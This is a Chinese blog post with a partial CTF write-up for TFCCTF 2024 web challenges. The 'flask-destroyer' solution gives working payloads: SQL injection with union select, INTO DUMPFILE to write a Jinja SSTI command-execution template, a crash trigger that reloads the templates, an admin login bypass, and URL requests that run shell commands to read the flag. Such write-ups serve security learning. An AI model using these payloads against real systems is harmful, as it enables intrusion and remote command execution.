+<blockquote>
+<p>Worst model of them all</p>
+</blockquote>
+<p>进去就是一个登录页，其他啥都没有</p>
+<img src="/posts/12526/image-20240806153647997.png" class title="awa">
+<p>看到了csrf的token</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.tfcctf.com:31185/register</span><br></pre></td></tr></table></figure>
+<p>发现<code>/register</code>能访问，是它的注册页。尝试注册一个账号</p>
+<img src="/posts/12526/image-20240806153851557.png" class title="awa">
+<p>登录成功后发现了能够添加admin好友，但是什么用都没有</p>
+<img src="/posts/12526/image-20240806154011092.png" class title="awa">
+<img src="/posts/12526/image-20240806155036562.png" class title="awa">
+<p>奇怪的东西出现了，我传一张图片之后它就变成了这样。感觉上它能够提取出图片的文字嵌入到页面当中？</p>
+<p>不懂</p>
+<h1><span id="flask-destroyer"> flask-destroyer</span></h1>
+<p>从附件可以得到是flask+mysql的结合。读dockerfile可知flag放在了这个地方</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Add flag</span></span><br><span class="line">RUN dir1=$(hexdump -vn16 -e&#x27;4/4 &quot;%08x&quot;&#x27; /dev/urandom); dir2=$(hexdump -vn16 -e&#x27;4/4 &quot;%08x&quot;&#x27; /dev/urandom); dir3=$(hexdump -vn16 -e&#x27;4/4 &quot;%08x&quot;&#x27; /dev/urandom); mkdir -p /tmp/$dir1/$dir2/$dir3; echo &#x27;&lt; REDACTED &gt;&#x27; &gt; /tmp/$dir1/$dir2/$dir3/flag.txt</span><br></pre></td></tr></table></figure>
+<p>给了mysql配置：</p>
+<img src="/posts/12526/image-20240806165309480.png" class title="awa">
+<p>这里说明我们可以直接写shell</p>
+<p>但是又因为是flask的，我们不知道该写啥，那就先往下看</p>
+<img src="/posts/12526/image-20240806165623180.png" class title="awa">
+<p>sql注入双引号闭合</p>
+<p>登录路由调用了这个函数：</p>
+<img src="/posts/12526/image-20240806165646354.png" class title="awa">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>发现报错</p>
+<p>尝试写内容，问题是写什么，然后写到哪个路径里</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@bp.route(<span class="params"><span class="string">&#x27;/&lt;string:page&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@bp.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;home.html&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>(<span class="params">page</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;id&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;main.login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    page = os.path.basename(page)</span><br><span class="line">    <span class="keyword">if</span> page <span class="keyword">not</span> <span class="keyword">in</span> registered_templates <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(os.path.join(<span class="string">&#x27;app/templates&#x27;</span>, page)):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;home.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(page)</span><br></pre></td></tr></table></figure>
+<p>发现这里可以渲染模板，逻辑是这样的，<code>registered_templates</code>是服务初始化时记录下<code>templates</code>目录下的模板，然后进行下面的检查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 访问的页面是否在registered_templates里</span><br><span class="line">2. 访问的页面是否在app/templates目录下是一个文件</span><br></pre></td></tr></table></figure>
+<p>如果两个条件都通过就会渲染<code>app/templates</code>下的目录。当然，前提是登录成功。</p>
+<p>问题来到<code>registered_templates</code>，他是服务启动时对<code>templates</code>目录下的文件进行了读取，然后保存到这个变量里。我们要怎么做才能够让<code>registered_templates</code>增加新的内容呢？只需要让服务重新启动一遍就行了，也就是说我们要让服务崩溃再重启一次即可。</p>
+<p>知道会渲染模板这下就简单了，要写进去的东西就是一个简单的ssti，但是要写到<code>/app/templates</code>下，注意在<code>dockerfile</code>里还有一个<code>/destroyer</code>上级目录。但是难点在于怎么让服务崩溃重启</p>
+<p>发现<code>/app/templates</code></p>
+<p>尝试写到这里，检查出字段数为3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aa&quot; union select 1,2,3#</span><br><span class="line">1</span><br><span class="line">返回正常，其他报错。</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa&quot; union select &#x27;&#x27;,&#x27;&#123;&#123;url_for.__globals__.os.popen(request.args.get(&quot;cmd&quot;)).read()&#125;&#125;&#x27;,&#x27;&#x27; into dumpfile &#x27;/destroyer/app/templates/acd.html&#x27;#</span><br></pre></td></tr></table></figure>
+<p>用<code>\x80</code>让flask崩溃，没懂原理，这个还是从其他地方学来的。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa&quot; union select 1, &#x27;&#x27;, x&#x27;80&#x27;#  </span><br></pre></td></tr></table></figure>
+<p>此时服务会崩溃，然后重启之后就会将我们的模板加载进去了。</p>
+<p>由于存在sql注入，这里admin的账号密码很容易用万能密码登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">1&quot; or &quot;1&quot; = &quot;1</span><br></pre></td></tr></table></figure>
+<p>接下来访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.tfcctf.com:32163/acd.html?cmd=whoami</span><br></pre></td></tr></table></figure>
+<p>然后去tmp找flag</p>
+<figure class="highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.tfcctf.com:32163/acd.html?cmd=cat%20/tmp/f2aa5cf8bed1f3ffb4fb088bbdb93cdc/bc00179790eae6bc51200efb033d418e/ee28a1915c821400641085562eae2388/flag.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TFCCTF&#123;Cr4Sh_g0_bRbRbRbRbR&#125;</span><br></pre></td></tr></table></figure>
+<img src="/posts/12526/image-20240806181903774.png" class title="awa">
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/12526.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/12526.html";
+            const title         = "「TFCCTF2024 web方向部分题解」";
+            const excerpt       = `老外的比赛，涨姿势了`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-08-11T05:24:21.113Z" itemprop="dateModified">最后编辑：2024-08-11</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 流量分析学习" href="/posts/28398.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/12526.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                71
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                14
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">15</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.66em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/12526.html"><i class="fa  fa-book"></i> TFCCTF2024 web方向部分题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/28398.html"><i class="fa  fa-book"></i> 流量分析学习</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/52077.html"><i class="fa  fa-book"></i> dasctf暑期挑战赛easyjob复现</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/35553.html"><i class="fa  fa-book"></i> CISCN ezjava另解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/58452.html"><i class="fa  fa-book"></i> 博客复活测试</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
